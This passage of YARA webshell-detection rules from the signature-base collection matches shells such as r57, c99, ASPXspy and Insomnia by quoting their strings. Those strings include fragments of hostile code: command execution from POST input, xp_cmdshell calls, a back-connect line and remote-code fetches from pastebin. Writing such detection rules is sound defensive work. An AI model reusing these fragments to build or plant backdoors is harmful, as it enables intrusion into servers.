		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		logic_hash = "b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"

	condition:
		all of them
}
rule SIGNATURE_BASE_BIN_Server {
    meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8956-L8972"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		logic_hash = "34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006 {
    meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8973-L8984"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		logic_hash = "536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "strBackDoor = strBackDoor "

	condition:
		all of them
}
rule SIGNATURE_BASE_R57Shell_3 {
    meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8985-L8996"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		logic_hash = "0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<b>\".$_POST['cmd']"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hdconfig {
    meta:
		description = "Webshells Auto-generated - file HDConfig.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6f743137-e85a-5298-b51e-c8792e507d28"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8997-L9012"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7d60e552fdca57642fd30462416347bd"
		logic_hash = "9001f79db15548cf3ca931d0043d078db7d900ab26093afbf5cd44d0a85800f4"
		score = 60
		quality = 55
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "An encryption key is derived from the password hash. "
		$s3 = "A hash object has been created. "
		$s4 = "Error during CryptCreateHash!"
		$s5 = "A new key container has been created."
		$s6 = "The password has been added to the hash. "

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Ajan_2 {
    meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9013-L9025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell_And_Exploit_CN_APT_HK : WEBSHELL {
    meta:
		description = "Webshell and Exploit Code in relation with APT against Honk Kong protesters"
		author = "Florian Roth (Nextron Systems)"
		id = "eb37a22b-4e8a-5986-bd47-4ef5b4986f47"
		date = "2014-10-10"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9027-L9042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "ec3f1e985585e1bf77a46e971a20cd127064a64467761a5a570548dd63ec57e2"
		score = 50
		quality = 85
		tags = "WEBSHELL"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$a0 = "<script language=javascript src=http://java-se.com/o.js</script>" fullword
		$s0 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">"
		$s1 = "<input type=\"hidden\" name=\"doing\" value=\"login\">"

	condition:
		$a0 or ( all of ($s*))
}
rule SIGNATURE_BASE_JSP_Browser_APT_Webshell {
    meta:
		description = "VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a"
		author = "Florian Roth (Nextron Systems)"
		id = "06988b5b-ec8b-5a10-b659-3e846057ea51"
		date = "2014-10-10"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9044-L9058"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a352bf394f1b4f70218650758db39225a5a505656299405ccd077592d29480a7"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1a = "private static final String[] COMMAND_INTERPRETER = {\"" ascii
		$a1b = "cmd\", \"/C\"}; // Dos,Windows" ascii
		$a2 = "Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));" ascii
		$a3 = "ret.append(\"!!!! Process has timed out, destroyed !!!!!\");" ascii

	condition:
		all of them
}
rule SIGNATURE_BASE_JSP_Jfigueiredo_APT_Webshell {
    meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		id = "b5080e43-44e2-54fa-b03a-057dc75d14db"
		date = "2014-12-10"
		modified = "2023-12-05"
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9060-L9073"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "7efaca469d09ce7ecba4ed38cb0b07d1b9fc4f45172d2ffb6f5d3259c000fdc5"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1 = "String fhidden = new String(Base64.encodeBase64(path.getBytes()));" ascii
		$a2 = "<form id=\"upload\" name=\"upload\" action=\"ServFMUpload\" method=\"POST\" enctype=\"multipart/form-data\">" ascii

	condition:
		all of them
}
rule SIGNATURE_BASE_JSP_Jfigueiredo_APT_Webshell_2 {
    meta:
		description = "JSP Browser used as web shell by APT groups - author: jfigueiredo"
		author = "Florian Roth (Nextron Systems)"
		id = "91575627-78c1-5ca1-8180-cc4004df88e8"
		date = "2014-12-10"
		modified = "2023-12-05"
		reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9075-L9090"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "f7fa5872d8eb4ba1d0b26d966d7650d70b1a10c56945d5a5340b8e1cb5d0f5f0"
		score = 60
		quality = 85
		tags = ""

	strings:
		$a1 = "<div id=\"bkorotator\"><img alt=\"\" src=\"images/rotator/1.jpg\"></div>" ascii
		$a2 = "$(\"#dialog\").dialog(\"destroy\");" ascii
		$s1 = "<form id=\"form\" action=\"ServFMUpload\" method=\"post\" enctype=\"multipart/form-data\">" ascii
		$s2 = "<input type=\"hidden\" id=\"fhidden\" name=\"fhidden\" value=\"L3BkZi8=\" />" ascii

	condition:
		all of ($a*) or all of ($s*)
}
rule SIGNATURE_BASE_Webshell_Insomnia {
    meta:
		description = "Insomnia Webshell - file InsomniaShell.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "62ed3695-9ab8-54d4-a9d2-b6270c56ccfb"
		date = "2014-12-09"
		modified = "2023-12-05"
		reference = "http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9092-L9113"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e0cfb2ffaa1491aeaf7d3b4ee840f72d42919d22"
		logic_hash = "d170c60f94092a38ba4af92283debd059eef2e4c683fd7737ffd60d1a2581d9c"
		score = 80
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Response.Write(\"- Failed to create named pipe:\");" fullword ascii
		$s1 = "Response.Output.Write(\"+ Sending {0}<br>\", command);" fullword ascii
		$s2 = "String command = \"exec master..xp_cmdshell 'dir > \\\\\\\\127.0.0.1" ascii
		$s3 = "Response.Write(\"- Error Getting User Info<br>\");" fullword ascii
		$s4 = "string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes," fullword ascii
		$s5 = "[DllImport(\"Advapi32.dll\", SetLastError = true)]" fullword ascii
		$s9 = "username = DumpAccountSid(tokUser.User.Sid);" fullword ascii
		$s14 = "//Response.Output.Write(\"Opened process PID: {0} : {1}<br>\", p" ascii

	condition:
		3 of them
}
rule SIGNATURE_BASE_Hawkeye_PHP_Panel : FILE {
    meta:
		description = "Detects HawkEye Keyloggers PHP Panel"
		author = "Florian Roth (Nextron Systems)"
		id = "1d185345-6684-538f-954a-45d57a618a7a"
		date = "2014-12-14"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9115-L9130"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e29b6df4e3aa3892b10e68218320ac76cecb5a1bbe6c48f2276014b972cbbdd8"
		score = 60
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$fname = $_GET['fname'];" ascii fullword
		$s1 = "$data = $_GET['data'];" ascii fullword
		$s2 = "unlink($fname);" ascii fullword
		$s3 = "echo \"Success\";" fullword ascii

	condition:
		all of ($s*) and filesize <600
}
rule SIGNATURE_BASE_Soaksoak_Infected_Wordpress {
    meta:
		description = "Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX"
		author = "Florian Roth (Nextron Systems)"
		id = "d147af65-72de-50be-9435-bef47eb4842a"
		date = "2014-12-15"
		modified = "2023-12-05"
		reference = "http://goo.gl/1GzWUX"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9132-L9147"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "4cba18a0d14be2795d71a1973265a1742beda57636f64c1974001ecf70e3e91d"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "wp_enqueue_script(\"swfobject\");" ascii fullword
		$s1 = "function FuncQueueObject()" ascii fullword
		$s2 = "add_action(\"wp_enqueue_scripts\", 'FuncQueueObject');" ascii fullword

	condition:
		all of ($s*)
}
rule SIGNATURE_BASE_Pastebin_Webshell {
    meta:
		description = "Detects a web shell that downloads content from pastebin.com http://goo.gl/7dbyZs"
		author = "Florian Roth (Nextron Systems)"
		id = "256051ed-da33-52b4-8bfb-ab990648d8fb"
		date = "2015-01-13"
		modified = "2023-12-05"
		reference = "http://goo.gl/7dbyZs"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9149-L9171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e71429e9280c37a90ee77be888ae743a86521d3632afc4eeec480b82a22a1445"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "file_get_contents(\"http://pastebin.com" ascii
		$s1 = "xcurl('http://pastebin.com/download.php" ascii
		$s2 = "xcurl('http://pastebin.com/raw.php" ascii
		$x0 = "if($content){unlink('evex.php');" ascii
		$x1 = "$fh2 = fopen(\"evex.php\", 'a');" ascii
		$y0 = "file_put_contents($pth" ascii
		$y1 = "echo \"<login_ok>" ascii
		$y2 = "str_replace('* @package Wordpress',$temp" ascii

	condition:
		1 of ($s*) or all of ($x*) or all of ($y*)
}
rule SIGNATURE_BASE_Aspxspy2 {
    meta:
		description = "Web shell - file ASPXspy2.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "b68e0c98-0136-58d8-a2d6-57abccb1e942"
		date = "2015-01-24"
		modified = "2023-12-05"
		reference = "not set"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9173-L9199"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5642387d92139bfe9ae11bfef6bfe0081dcea197"
		logic_hash = "59c88f8e2542dcde4bf5123147ea2c1ca408925ca966f3f34a4692a3ba7a0935"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s3 = "Process[] p=Process.GetProcesses();" fullword ascii
		$s4 = "Response.Cookies.Add(new HttpCookie(vbhLn,Password));" fullword ascii
		$s5 = "[DllImport(\"kernel32.dll\",EntryPoint=\"GetDriveTypeA\")]" fullword ascii
		$s6 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssCl" ascii
		$s7 = "ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();" fullword ascii
		$s8 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_bla" ascii
		$s10 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility." ascii
		$s11 = "nxeDR.Command+=new CommandEventHandler(this.iVk);" fullword ascii
		$s12 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
		$s13 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
		$s17 = "Response.Redirect(\"http://www.rootkit.net.cn\");" fullword ascii
		$s20 = "else if(Reg_Path.StartsWith(\"HKEY_USERS\"))" fullword ascii

	condition:
		6 of them
}
rule SIGNATURE_BASE_Webshell_27_9_C66_C99 : FILE {
    meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
		author = "Florian Roth (Nextron Systems)"
		id = "4b985ae7-1ae6-5976-9e8d-0d6b5faed75b"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9210-L9235"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "71ae0a3843151a2eec913f62167b23cf9e0c759b18ebe0759174d3503fb23717"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash3 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash4 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
		hash5 = "6ce99e07aa98ba6dc521c34cf16fbd89654d0ba59194878dffca857a4c34e57b"
		hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash7 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash8 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash9 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash10 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"

	strings:
		$s4 = "if (!empty($unset_surl)) {setcookie(\"c99sh_surl\"); $surl = \"\";}" fullword ascii
		$s6 = "@extract($_REQUEST[\"c99shcook\"]);" fullword ascii
		$s7 = "if (!function_exists(\"c99_buff_prepare\"))" fullword ascii

	condition:
		filesize <685KB and 1 of them
}
rule SIGNATURE_BASE_Webshell_Acid_Antisecshell_3 : FILE {
    meta:
		description = "Detects Webshell Acid"
		author = "Florian Roth (Nextron Systems)"
		id = "68d59f1e-ef35-586b-805d-1e6e3548d092"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9237-L9269"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c8c3fcde7afdafe8ead59e24e432fdd4ccae99f96f67b4be3e5a9cd74ff9b2e7"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash4 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash5 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash6 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash7 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash8 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash9 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash10 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash11 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash12 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash13 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash14 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash15 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash16 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash17 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash18 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

	strings:
		$s0 = "echo \"<option value=delete\".($dspact == \"delete\"?\" selected\":\"\").\">Delete</option>\";" fullword ascii
		$s1 = "if (!is_readable($o)) {return \"<font color=red>\".view_perms(fileperms($o)).\"</font>\";}" fullword ascii

	condition:
		filesize <900KB and all of them
}
rule SIGNATURE_BASE_Webshell_C99_4 : FILE {
    meta:
		description = "Detects C99 Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "d5035906-df17-5149-92ae-51e6ec05996e"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9271-L9302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "fa095d8da737e24a913eeadaca2882475366bf5cf0911dd9ff44aaa04871cc0f"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash3 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash4 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
		hash5 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash6 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash7 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash8 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
		hash9 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash10 = "615e768522447558970c725909e064558f33d38e6402c63c92a1a8bc62b64966"
		hash11 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash12 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash13 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
		hash14 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

	strings:
		$s1 = "displaysecinfo(\"List of Attributes\",myshellexec(\"lsattr -a\"));" fullword ascii
		$s2 = "displaysecinfo(\"RAM\",myshellexec(\"free -m\"));" fullword ascii
		$s3 = "displaysecinfo(\"Where is perl?\",myshellexec(\"whereis perl\"));" fullword ascii
		$s4 = "$ret = myshellexec($handler);" fullword ascii
		$s5 = "if (posix_kill($pid,$sig)) {echo \"OK.\";}" fullword ascii

	condition:
		filesize <900KB and 1 of them
}
rule SIGNATURE_BASE_Webshell_R57Shell_2 : FILE {
    meta:
		description = "Detects Webshell R57"
		author = "Florian Roth (Nextron Systems)"
		id = "f2298430-1eff-5ed2-abee-3b26b36d16b7"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9304-L9331"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "2af51c3d181801b14d5dbb3107cd78cf7ab4a590b7967f231ec707b7ee03fa26"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
		hash2 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash3 = "aa957ca4154b7816093d667873cf6bdaded03f820e84d8f1cd5ad75296dd5d4d"
		hash4 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash5 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
		hash6 = "16b6ec4b80f404f4616e44d8c21978dcdad9f52c84d23ba27660ee8e00984ff2"
		hash7 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
		hash8 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
		hash9 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash10 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash11 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash12 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash13 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"

	strings:
		$s1 = "$connection = @ftp_connect($ftp_server,$ftp_port,10);" fullword ascii
		$s2 = "echo $lang[$language.'_text98'].$suc.\"\\r\\n\";" fullword ascii

	condition:
		filesize <900KB and all of them
}
rule SIGNATURE_BASE_Webshell_27_9_Acid_C99_Locus7S : FILE {
    meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "f5f33b64-b815-5e32-8d2e-5e455651ec5d"
		date = "2016-01-11"
		modified = "2023-12-05"
		reference = "https://github.com/nikicat/web-malware-collection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L9333-L9355"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "3005c09dfcb1f2e33a09ed73e28ef889c74e1f5daf619dd272e0b9b30cdb0f94"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
		hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"

	strings:
		$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
		$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii

	condition:
		filesize <1711KB and 1 of them
}
